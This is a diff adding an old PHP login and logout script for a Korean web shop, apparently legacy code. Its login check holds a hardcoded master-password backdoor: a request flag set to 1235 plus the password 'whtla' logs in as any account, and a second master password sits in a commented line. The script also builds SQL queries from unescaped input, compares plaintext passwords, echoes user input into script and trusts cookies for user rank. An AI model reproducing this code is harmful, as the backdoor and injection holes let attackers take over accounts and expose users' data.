@@ -1,0 +1,94 @@
+<?
+include "../db.htm";
+include "/nfs/php/lib/ut.htm";
+include "../utbase.htm";
+include "/nfs/php/lib/template2.htm";
+
+$connect=mysql_connect($DB_HOST,$DB_USER,$DB_PASS);
+
+if ($cmd=="check_login") {
+  //=============DB 접속 ========================
+  if (strlen($log_id)<3||$log_id=="guest") {alert2('Check ID');exit;}
+  if (strlen($log_passwd)<3) {alert2('Check PASSWORD');exit;}
+
+  $query = "select * from user where id='$log_id'";
+  $result=mysql_db_query($DB_NAME,$query);
+  if (!$result) {echo $query,mysql_error();exit;}
+  $user=mysql_fetch_array($result);
+  if (!$user[id]) {
+     echo("<script>window.alert('\"$log_id\" Not found in userdata');history.go(-1)</script>");exit;
+  }
+  if($super_user==1235&&$log_passwd=="whtla") $log_passwd=$user[passwd];
+//  if(!is_super_user($user[id])&&$log_passwd=="akssmdwhtla") $log_passwd=$user[passwd];
+  if($log_passwd!=$user[passwd]) {
+     echo("<script>window.alert('Check password');history.go(-1)</script>");exit;
+  }
+  $userid=$user[id];
+  $userna=$user[name];
+  $userty=$user[type];
+  $userpw=$user[passwd];
+
+  $date_str=date("Y-m-d H:i:s");
+  $query = "UPDATE user set login='$now_date',all_log=all_log+1 where id='$userid'";
+  $result=mysql_db_query($DB_NAME,$query);
+  if (!$result) {echo $query,mysql_error();exit;}
+
+  setcookie("userid", $userid,      0, "/");
+  setcookie("userna", $userna,      0, "/");
+  setcookie("userty", $userty,      0, "/");
+  setcookie("userbuy",$user[buy_total],  0, "/");
+  setcookie("usercount",$user[buy], 0, "/");
+  setcookie("userlogin",$now_date,  0, "/");
+  setcookie("save_money",$user[save_money],0,"/");
+  if ($user[buy]) $usercount=$user[buy];
+  $cmd="";
+  if ($ret=="main") {go_url("../");exit;}
+}
+
+if ($cmd=="logout") {
+	$query = "UPDATE user set logout='$now_date' where id='$userid'";
+	$result=mysql_db_query($DB_NAME,$query);
+
+	record("logout","");
+    $uname=$userid;
+    setcookie("userid");
+    setcookie("userna");
+    setcookie("userid","", 0, "/");
+    setcookie("userna","", 0, "/");
+    setcookie("userty","", 0, "/");
+    setcookie("usercount","", 0, "/");
+    setcookie("userbuy","", 0, "/");
+    setcookie("userlogin","", 0, "/");
+    setcookie("save_money","",0,"/");
+    $userid=$userna="guest";
+    echo("
+    <center>
+    <table border='0' width='100%' height='100%'>
+    <tr><td align='center' valign='middle'>
+    <h3>$uname 님은 로그아웃(logout) 되었습니다.<BR>
+    </td></tr>
+    </table>
+    ");
+
+    if ($ret=="main") go_url("/");
+	else go_url("./");
+    exit;
+}
+$tpl = new template("./"); 
+$tpl->define("main","index_t.htm");
+
+$tpl->assign(  array(
+로그인				=> $login_form,
+상단메뉴			=> file2str("../bbstop.htm"),
+왼쪽메뉴			=> file2str("../left.htm"),
+하단메뉴			=> file2str("../bottom.htm"),
+아이디				=> $userid,
+이름				=> $userna,
+등급				=> $userty,
+)  );
+$tpl->parse("main"); 
+$tpl->tprint("main"); 
+
+
+
+?>
